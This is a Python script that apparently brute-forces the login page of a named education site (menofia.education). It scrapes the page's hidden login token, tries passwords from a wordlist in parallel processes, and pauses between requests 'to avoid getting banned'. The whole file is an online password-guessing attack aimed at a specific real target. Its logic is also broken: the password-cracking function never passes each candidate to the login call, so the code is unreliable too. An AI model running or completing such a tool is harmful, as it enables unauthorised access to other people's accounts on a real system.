import re
import time
import requests
from bs4 import BeautifulSoup
from multiprocessing import Pool

MAX_THREADS = 6
LOGIN_URL = "https://menofia.education/login/index.php"
USERNAME = "YourID"
PASSWORD = "YourPassword"
WORDLIST = "wordlist.lst"


def login():

    session = requests.Session()

    page = session.get(LOGIN_URL)

    pattern = '<input type="hidden" name="logintoken" value="\w{32}">'

    token = re.findall(pattern, page.text)

    token = re.findall("\w{32}", token[0])

    data = {
        'username': USERNAME,
        'password': PASSWORD,
        'anchor': "",
        'logintoken': token[0]
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'
    }

    # to avoid getting banned
    time.sleep(1)

    resp = session.post(LOGIN_URL, data=data, headers=headers)

    print(resp.url)

    return resp


def crack_password(password):

    response = login()

    if bytes('Login failed', encoding='utf-8') not in response.content:
        return password


def main():
    with open(WORDLIST) as passwords_file:
        passwords = passwords_file.readlines()

    with Pool(MAX_THREADS) as pool:
        results = pool.map(crack_password, passwords)
        success = list(filter(None, results))

    print(success)


if __name__ == '__main__':

    # for testing
    login()
